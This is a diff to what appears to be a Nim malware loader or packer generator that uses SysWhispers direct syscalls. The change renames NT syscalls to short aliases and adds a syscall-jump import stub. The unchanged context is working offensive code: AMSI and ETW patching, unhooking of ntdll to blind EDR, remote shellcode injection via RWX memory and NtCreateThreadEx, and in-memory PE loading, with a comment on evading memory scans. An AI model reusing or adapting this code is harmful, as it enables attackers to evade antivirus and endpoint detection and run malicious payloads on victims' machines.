@@ -8,6 +8,13 @@ import whispers/syscalls
 
 """
 
+let WhispersJumpStub * = """
+
+
+import whispers/syscallsjump
+
+"""
+
 let WhispersAMSIPatchStub * = """
 
 
@@ -46,7 +53,7 @@ proc PatchAmsi(): bool =
         buffer          : LPVOID
 
 
-    status = NtProtectVirtualMemory(pHandle, addr protectAddress,addr friendlycodeLength,0x40,addr t)
+    status = NtPVM(pHandle, addr protectAddress,addr friendlycodeLength,0x40,addr t)
                 
     if not NT_SUCCESS(status):
         echo obf("[-] Failed to change memory protections.")
@@ -57,15 +64,15 @@ proc PatchAmsi(): bool =
         bytesWritten: SIZE_T
 
     var outLength: SIZE_T
-    status = NtWriteVirtualMemory(pHandle,cs,unsafeAddr patch,patch.len,addr outLength)
+    status = NtWVM(pHandle,cs,unsafeAddr patch,patch.len,addr outLength)
 
     if not NT_SUCCESS(status):
         echo obf("[-] Failed to write memory.")
     else:
-        echo obf("[+] NtWriteVirtualMemory Succeed!")
+        echo obf("[+] NtWVM Succeed!")
                 
                
-    status = NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
+    status = NtPVM(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                 
     if not NT_SUCCESS(status):
         echo obf("[-] Failed to allocate memory.")
@@ -114,21 +121,21 @@ proc Patchntdll(): bool =
     var protectAddress = cs
 
     var friendlycodeLength = cast[SIZE_T](patch.len)
-    success = NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
+    success = NtPVM(hProcess,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
     if (success != 0):
-        echo obf("NtProtectVirtualMemory failed")
+        echo obf("NtPVM failed")
         return disabled
     echo obf("[*] Applying Syscall (SysWhispers) ETW patch")
     var outLength: SIZE_T
     
-    success = NtWriteVirtualMemory(hProcess,cs,unsafeAddr patch,patch.len,addr outLength)
+    success = NtWVM(hProcess,cs,unsafeAddr patch,patch.len,addr outLength)
     
     if (success != 0):
-        echo obf("NtWriteVirtualMemory failed")
+        echo obf("NtWVM failed")
         return disabled
-    success =  NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,t,addr op)
+    success =  NtPVM(hProcess,addr protectAddress,addr friendlycodeLength,t,addr op)
     if (success != 0):
-        echo obf("NtProtectVirtualMemory failed")
+        echo obf("NtPVM failed")
         return disabled
     else:
         echo obf("[*] OldProtect set back")
@@ -180,21 +187,21 @@ proc ntdllunhook(): bool =
           var bytesWritten: SIZE_T
           var ds: LPVOID = ntdllBase + hookedSectionHeader.VirtualAddress
           var pSize: SIZE_T = cast[SIZE_T](hookedSectionHeader.Misc.VirtualSize)
-          status = NtProtectVirtualMemory(processH, &ds, &pSize, 0x40, &oldProtection)
+          status = NtPVM(processH, &ds, &pSize, 0x40, &oldProtection)
           if status != 0:
-            echo obf("[!] NtProtectVirtualMemory failed to modify memory permissions:") & fmt"{GetLastError()}."
+            echo obf("[!] NtPVM failed to modify memory permissions:") & fmt"{GetLastError()}."
             return false
-          status = NtWriteVirtualMemory(processH, ds, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, pSize, addr bytesWritten);
+          status = NtWVM(processH, ds, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, pSize, addr bytesWritten);
           if status != 0:
-            echo obf("[!] NtWriteVirtualMemory failed to write bytes to target address:") & fmt"{GetLastError()}."
+            echo obf("[!] NtWVM failed to write bytes to target address:") & fmt"{GetLastError()}."
             return false
-          status = NtProtectVirtualMemory(processH, &ds, &pSize, oldProtection, &oldProtection2)
+          status = NtPVM(processH, &ds, &pSize, oldProtection, &oldProtection2)
           if status != 0:
-            echo obf("[!] NtProtectVirtualMemory failed to reset memory back to it's orignal protections:") & fmt"{GetLastError()}."
+            echo obf("[!] NtPVM failed to reset memory back to it's orignal protections:") & fmt"{GetLastError()}."
             return false
-  status = NtClose(processH)
-  status = NtClose(ntdllFile)
-  status = NtClose(ntdllMapping)
+  status = NtCl(processH)
+  status = NtCl(ntdllFile)
+  status = NtCl(ntdllMapping)
   discard MyFreeLibrary(ntdllModule)
   return true
 
@@ -221,7 +228,7 @@ proc pwndemWhispersLike[byte](friendlycode: openarray[byte]): void =
             dataSz          : SIZE_T            = cast[SIZE_T](friendlycode.len)
 
 
-        status = NtAllocateVirtualMemory(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+        status = NtAVM(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
                 
         if not NT_SUCCESS(status):
             echo obf("[-] Failed to allocate memory.")
@@ -231,12 +238,12 @@ proc pwndemWhispersLike[byte](friendlycode: openarray[byte]): void =
         var 
             bytesWritten: SIZE_T
 
-        status = NtWriteVirtualMemory(pHandle,buffer,unsafeAddr friendlycode,dataSz-1,addr bytesWritten)
+        status = NtWVM(pHandle,buffer,unsafeAddr friendlycode,dataSz-1,addr bytesWritten)
 
         if not NT_SUCCESS(status):
             echo obf("[-] Failed to write memory.")
         else:
-            echo obf("[+] NtWriteVirtualMemory - wrote bytes ") & fmt"{bytesWritten}"
+            echo obf("[+] NtWVM - wrote bytes ") & fmt"{bytesWritten}"
                 
             
         let f = cast[proc(){.nimcall.}](buffer)
@@ -272,36 +279,36 @@ proc remoteLoadAmsi(processID: var DWORD): bool =
     cid.UniqueProcess = processID
 
     
-    status = NtOpenProcess(
+    status = NtOP(
         &pHandle,
         PROCESS_ALL_ACCESS, 
         &oa, &cid         
     )
 
-    echo obf("[*] NtOpenProcess: "), status
+    echo obf("[*] NtOP: "), status
 
 
-    status = NtAllocateVirtualMemory(
+    status = NtAVM(
         pHandle, &ds, 0, &sc_size, 
         MEM_COMMIT, 
         PAGE_EXECUTE_READWRITE)
-    echo obf("[*] NtAllocateVirtualMemory: "), status
+    echo obf("[*] NtAVM: "), status
     var bytesWritten: SIZE_T
 
 
-    status = NtWriteVirtualMemory(
+    status = NtWVM(
         pHandle, 
         ds, 
         unsafeAddr friendlycode, 
         sc_size-1, 
         addr bytesWritten)
 
-    echo obf("[*] NtWriteVirtualMemory: "), status
+    echo obf("[*] NtWVM: "), status
     echo obf("    \\-- bytes written: "), bytesWritten
     echo obf("")
 
     var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA"));
-    status = NtCreateThreadEx(
+    status = NtCTE(
         &tHandle, 
         THREAD_ALL_ACCESS, 
         NULL, 
@@ -310,8 +317,8 @@ proc remoteLoadAmsi(processID: var DWORD): bool =
         ds, FALSE, 0, 0, 0, NULL)
 
 
-    status = NtClose(tHandle)
-    status = NtClose(pHandle)
+    status = NtCl(tHandle)
+    status = NtCl(pHandle)
     if(status == 0):
       return true
     else:
@@ -350,7 +357,7 @@ proc RemotePatchAmsi(hProcss :HANDLE): bool =
         buffer          : LPVOID
 
 
-    status = NtProtectVirtualMemory(hProcss, addr protectAddress,addr friendlycodeLength,0x40,addr t)
+    status = NtPVM(hProcss, addr protectAddress,addr friendlycodeLength,0x40,addr t)
                 
     if not NT_SUCCESS(status):
         echo obf("[-] Failed to allocate memory.")
@@ -361,14 +368,14 @@ proc RemotePatchAmsi(hProcss :HANDLE): bool =
         bytesWritten: SIZE_T
 
     var outLength: SIZE_T
-    status = NtWriteVirtualMemory(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)
+    status = NtWVM(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)
 
     if not NT_SUCCESS(status):
         echo obf("[-] Failed to write memory.")
     else:
-        echo obf("[+] NtWriteVirtualMemory Succeed!")
+        echo obf("[+] NtWVM Succeed!")
                 
-    status = NtProtectVirtualMemory(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
+    status = NtPVM(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                 
     if not NT_SUCCESS(status):
         echo obf("[-] Failed to allocate memory.")
@@ -413,36 +420,36 @@ proc remoteLoadNtdll(processID: var DWORD): bool =
     cid.UniqueProcess = processID
 
     
-    status = NtOpenProcess(
+    status = NtOP(
         &pHandle,
         PROCESS_ALL_ACCESS, 
         &oa, &cid         
     )
 
-    echo obf("[*] NtOpenProcess: "), status
+    echo obf("[*] NtOP: "), status
 
 
-    status = NtAllocateVirtualMemory(
+    status = NtAVM(
         pHandle, &ds, 0, &sc_size, 
         MEM_COMMIT, 
         PAGE_EXECUTE_READWRITE)
-    echo obf("[*] NtAllocateVirtualMemory: "), status
+    echo obf("[*] NtAVM: "), status
     var bytesWritten: SIZE_T
 
 
-    status = NtWriteVirtualMemory(
+    status = NtWVM(
         pHandle, 
         ds, 
         unsafeAddr friendlycode, 
         sc_size-1, 
         addr bytesWritten)
 
-    echo obf("[*] NtWriteVirtualMemory: "), status
+    echo obf("[*] NtWVM: "), status
     echo obf("    \\-- bytes written: "), bytesWritten
     echo obf("")
 
     var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA"));
-    status = NtCreateThreadEx(
+    status = NtCTE(
         &tHandle, 
         THREAD_ALL_ACCESS, 
         NULL, 
@@ -451,8 +458,8 @@ proc remoteLoadNtdll(processID: var DWORD): bool =
         ds, FALSE, 0, 0, 0, NULL)
 
 
-    status = NtClose(tHandle)
-    status = NtClose(pHandle)
+    status = NtCl(tHandle)
+    status = NtCl(pHandle)
     if(status == 0):
       return true
     else:
@@ -490,7 +497,7 @@ proc RemotePatchEtw(hProcess : HANDLE) : bool =
         buffer          : LPVOID
 
 
-    status = NtProtectVirtualMemory(hProcess, addr protectAddress,addr friendlycodeLength,0x40,addr t)
+    status = NtPVM(hProcess, addr protectAddress,addr friendlycodeLength,0x40,addr t)
                 
     if not NT_SUCCESS(status):
         echo obf("[-] Failed to allocate memory.")
@@ -501,15 +508,15 @@ proc RemotePatchEtw(hProcess : HANDLE) : bool =
         bytesWritten: SIZE_T
 
     var outLength: SIZE_T
-    status = NtWriteVirtualMemory(hProcess,RemoteProc,unsafeAddr patch,patch.len,addr outLength)
+    status = NtWVM(hProcess,RemoteProc,unsafeAddr patch,patch.len,addr outLength)
 
     if not NT_SUCCESS(status):
         echo obf("[-] Failed to write memory.")
     else:
-        echo obf("[+] NtWriteVirtualMemory Succeed!")
+        echo obf("[+] NtWVM Succeed!")
                 
 
-    status = NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
+    status = NtPVM(hProcess,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                 
     if not NT_SUCCESS(status):
         echo obf("[-] Failed to allocate memory.")
@@ -571,36 +578,36 @@ let WhispersShellcoderemoteinjectStub * = """
     var success: BOOL
 
     
-    status = NtOpenProcess(
+    status = NtOP(
         &pHandle,
         PROCESS_ALL_ACCESS, 
         &oa, &cid         
     )
 
-    echo obf("[*] NtOpenProcess: "), status
+    echo obf("[*] NtOP: "), status
 
 
-    status = NtAllocateVirtualMemory(
+    status = NtAVM(
         pHandle, &ds, 0, &sc_size, 
         MEM_COMMIT, 
         PAGE_EXECUTE_READWRITE)
-    echo obf("[*] NtOpenProcess: "), status
+    echo obf("[*] NtOP: "), status
     var bytesWritten: SIZE_T
 
 
-    status = NtWriteVirtualMemory(
+    status = NtWVM(
         pHandle, 
         ds, 
         unsafeAddr friendlycode, 
         sc_size-1, 
         addr bytesWritten)
 
-    echo obf("[*] NtWriteVirtualMemory: "), status
+    echo obf("[*] NtWVM: "), status
     echo obf("    \\-- bytes written: "), bytesWritten
     echo obf("")
 
 
-    status = NtCreateThreadEx(
+    status = NtCTE(
         &tHandle, 
         THREAD_ALL_ACCESS, 
         NULL, 
@@ -609,8 +616,8 @@ let WhispersShellcoderemoteinjectStub * = """
         NULL, FALSE, 0, 0, 0, NULL)
 
 
-    status = NtClose(tHandle)
-    status = NtClose(pHandle)
+    status = NtCl(tHandle)
+    status = NtCl(pHandle)
 
     echo success
    
@@ -838,9 +845,9 @@ proc pwndem(): void =
     var ds: LPVOID
 
 
-    var status: NTSTATUS = NtAllocateVirtualMemory(pHandle2, &preferAddr, 0, &allocsize,MEM_COMMIT or MEM_RESERVE,PAGE_EXECUTE_READWRITE)
+    var status: NTSTATUS = NtAVM(pHandle2, &preferAddr, 0, &allocsize,MEM_COMMIT or MEM_RESERVE,PAGE_EXECUTE_READWRITE)
     
-    echo obf("NtAllocateVirtualMemory:")
+    echo obf("NtAVM:")
     echo status
     
     
@@ -851,9 +858,9 @@ proc pwndem(): void =
     ntHeader.OptionalHeader.ImageBase = cast[ULONGLONG](preferAddr)
     
     var bytesWritten: SIZE_T
-    status = NtWriteVirtualMemory(pHandle2,preferAddr,shellcodePtr,ntHeader.OptionalHeader.SizeOfHeaders,addr bytesWritten)
+    status = NtWVM(pHandle2,preferAddr,shellcodePtr,ntHeader.OptionalHeader.SizeOfHeaders,addr bytesWritten)
     
-    echo obf("NtWriteVirtualMemory:")
+    echo obf("NtWVM:")
     echo status
     
     
@@ -862,8 +869,8 @@ proc pwndem(): void =
     while i < cast[int](ntHeader.FileHeader.NumberOfSections):
       var dest: LPVOID = (preferAddr + SectionHeaderArr[i].VirtualAddress)
       var source: LPVOID = (shellcodePtr + SectionHeaderArr[i].PointerToRawData)
-      status = NtWriteVirtualMemory(pHandle2,dest,source,cast[DWORD](SectionHeaderArr[i].SizeOfRawData),addr bytesWritten)
-      echo obf("NtWriteVirtualMemory for section: "), toString(SectionHeaderArr[i].Name)
+      status = NtWVM(pHandle2,dest,source,cast[DWORD](SectionHeaderArr[i].SizeOfRawData),addr bytesWritten)
+      echo obf("NtWVM for section: "), toString(SectionHeaderArr[i].Name)
       echo status
       inc(i)
     
@@ -882,9 +889,9 @@ proc pwndem(): void =
       op: ULONG
       t: ULONG
     # Setting the protection to PAGE_NOACCESS afterwards could bypass in memory scans if the execution was completed fast enough.
-    status =  NtProtectVirtualMemory(pHandle2,addr protectAddress,addr allocsize,0x01,addr op)
+    status =  NtPVM(pHandle2,addr protectAddress,addr allocsize,0x01,addr op)
     if (status != 0):
-        echo obf("NtProtectVirtualMemory failed")
+        echo obf("NtPVM failed")
         echo status
         echo GetLastError()
     else:
